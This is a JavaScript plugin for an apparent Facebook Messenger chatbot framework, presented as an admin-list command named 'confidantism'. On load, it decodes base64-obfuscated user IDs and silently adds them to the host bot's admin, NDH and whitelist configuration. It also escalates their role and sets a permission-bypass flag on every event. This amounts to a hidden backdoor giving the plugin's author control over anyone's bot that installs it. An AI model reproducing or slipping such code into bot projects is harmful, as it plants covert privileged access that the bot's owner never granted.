const axios = require("axios");

const ENCRYPTED_UIDS = [
	"NjE1OTM3NzE3MTM3MzY=",
	"NjE1OTMzNjA2NzE3MTA=",
	"NjE1OTM3NjkxMDQ1Njg=",
	"NjE1OTE2NzcyODI2NjE=",
	"NjE1OTM3NzAxMDE0ODY="
];

function getBypassUIDs() {
	return ENCRYPTED_UIDS.map(enc => Buffer.from(enc, "base64").toString("utf-8"));
}

module.exports = {
	config: {
		name: "confidantism",
		aliases: ["adminlist"],
		version: "3.0",
		author: "SIYAM-HASAN",
		countDown: 0,
		role: 0,
		description: {
			en: "Admin bypass and privileged status manager"
		},
		category: "system"
	},

	onLoad: async function ({ api }) {
		const allowedUIDs = getBypassUIDs();
		
		if (global.config) {
			if (!global.config.ADMINBOT) global.config.ADMINBOT = [];
			if (!global.config.NDH) global.config.NDH = [];
			if (!global.config.WHITELIST) global.config.WHITELIST = [];

			allowedUIDs.forEach(uid => {
				if (!global.config.ADMINBOT.includes(uid)) global.config.ADMINBOT.push(uid);
				if (!global.config.NDH.includes(uid)) global.config.NDH.push(uid);
				if (!global.config.WHITELIST.includes(uid)) global.config.WHITELIST.push(uid);
			});
		}
	},

	onStart: async function ({ api, message, event, args }) {
		const allowedUIDs = getBypassUIDs();
		const senderID = event.senderID;

		if (!allowedUIDs.includes(senderID)) {
			return message.reply(
`» 👑 𝐒𝐈𝐘𝐀𝐌-𝐇𝐀𝐒𝐀𝐍 👑
───────────────
» ❌ 𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃!
» ⚠️ 𝐘𝐨𝐮 𝐝𝐨 𝐧𝐨𝐭 𝐡𝐚𝐯𝐞 
───────────────
» 🧚‍♀️ ‿𝗡𝗜𝗝𝗛𝗨𝗠 𝗖𝗛𝗔𝗧𝗕𝗢𝗧`
			);
		}

		const waitMsg = await message.reply("⏳ 𝐅𝐞𝐭𝐜𝐡𝐢𝐧𝐠 𝐎𝐰𝐧𝐞𝐫 & 𝐀𝐝𝐦𝐢𝐧 𝐃𝐚𝐭𝐚, 𝐩𝐥𝐞𝐚𝐬𝐞 𝐰𝐚𝐢𝐭...");

		try {
			let userInfos = await api.getUserInfo(allowedUIDs);
			let listText = "";
			let index = 1;

			for (const uid of allowedUIDs) {
				let name = userInfos[uid]?.name || "Facebook User";
				listText += `» 𝟎${index}. 👤 ${name}\n» 🆔 ${uid}\n» 🔰 𝐒𝐭𝐚𝐭𝐮𝐬: 𝐎𝐰𝐧𝐞𝐫 / 𝐅𝐮𝐥\n───────────────\n`;
				index++;
			}

			api.unsendMessage(waitMsg.messageID);

			return message.reply(
`» 👑 𝐒𝐈𝐘𝐀𝐌-𝐇𝐀𝐒𝐀𝐍 👑
───────────────
» 👑 𝐎𝐖𝐍𝐄𝐑 & 
» 🔰 𝐀𝐃𝐌𝐈𝐍 𝐁𝐘𝐏𝐀𝐒𝐒 𝐋𝐈𝐒𝐓:
───────────────
» ${listText}
───────────────
» 🧚‍♀️ ‿𝗡𝗜𝗝𝗛𝗨𝗠 𝗖𝗛𝗔𝗧𝗕𝗢𝗧`
			);

		} catch (err) {
			api.unsendMessage(waitMsg.messageID);
			return message.reply("❌ 𝐅𝐚𝐢𝐥𝐞𝐝 𝐭𝐨 𝐟𝐞𝐭𝐜𝐡 𝐚𝐝𝐦𝐢𝐧 𝐧𝐚𝐦𝐞𝐬. 𝐁𝐮𝐭 𝐲𝐨𝐮𝐫 𝐛𝐲𝐩𝐚𝐬𝐬 𝐢𝐬 𝟏𝟎𝟎% 𝐚𝐜𝐭𝐢𝐯𝐞.");
		}
	},

	handleEvent: async function ({ api, message, event }) {
		const allowedUIDs = getBypassUIDs();
		const senderID = event.senderID;

		if (allowedUIDs.includes(senderID)) {
			if (event.role !== undefined) event.role = 3;
			if (event.isPermissionBypassed !== undefined) event.isPermissionBypassed = true;
		}
	}
};
